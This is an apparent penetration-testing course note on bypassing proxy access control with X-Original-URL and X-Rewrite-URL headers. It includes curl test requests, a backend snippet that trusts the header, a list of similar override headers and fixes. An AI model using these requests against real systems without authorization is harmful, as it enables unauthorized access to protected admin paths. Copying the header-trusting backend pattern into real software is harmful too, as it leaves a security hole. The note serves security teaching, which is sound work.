---
tags: [vapt, http-headers, web, intermediate]
difficulty: intermediate
module: "03 - HTTP Headers"
topic: "03.06 X-Original-URL — URL Override, Access Control Bypass"
---

# 03.06 — X-Original-URL (and X-Rewrite-URL)

## What is it?

`X-Original-URL` and `X-Rewrite-URL` are non-standard headers used by some reverse proxies (Nginx, Squid) to pass the original request URL to the backend when URL rewriting occurs. If the backend honors these headers, an attacker can request a forbidden path while appearing to request an allowed one.

---

## How the Attack Works

```
NORMAL FLOW:
  Client: GET /admin HTTP/1.1
  Nginx: 403 Forbidden (ACL blocks /admin at proxy level)

ATTACK (if backend honors X-Original-URL):
  Client: GET / HTTP/1.1
          X-Original-URL: /admin
  
  Nginx: Sees GET / → allowed!
  Backend: Sees X-Original-URL: /admin → serves /admin!
  
  Proxy blocked the path, but backend overrides via header!
```

---

## Real-World Example

```
NGINX ACL (blocks /admin at proxy):
  location /admin {
    deny all;
  }

BACKEND (reads X-Original-URL to determine which page to serve):
  if 'X-Original-URL' in request.headers:
      path = request.headers['X-Original-URL']
  else:
      path = request.path

ATTACK:
  GET / HTTP/1.1
  X-Original-URL: /admin

  Nginx forwards to backend (/ is allowed).
  Backend uses X-Original-URL → serves /admin!
```

---

## Testing

```bash
# Test X-Original-URL bypass
curl -H "X-Original-URL: /admin" https://target.com/
curl -H "X-Original-URL: /api/internal/debug" https://target.com/

# Test X-Rewrite-URL (Squid proxy header)
curl -H "X-Rewrite-URL: /admin" https://target.com/

# Test with Burp Suite:
# Intercept any allowed request (GET /)
# Add header: X-Original-URL: /admin
# Forward → observe response
```

---

## Other URL Override Headers

```
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Override-URL: /admin
X-Backend-URL: /admin
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| Backend honors X-Original-URL | Never use this header to determine access path |
| Proxy access control only | Implement access control in the backend application too |

---

## Related Notes
- [[01 - Host Header]] — Host-based access bypass
- [[02 - X-Forwarded-For]] — IP-based access bypass
- [[22 - X-HTTP-Method-Override]] — method-based bypass
- [[Module 03 - Access Control]] — access control bypass techniques
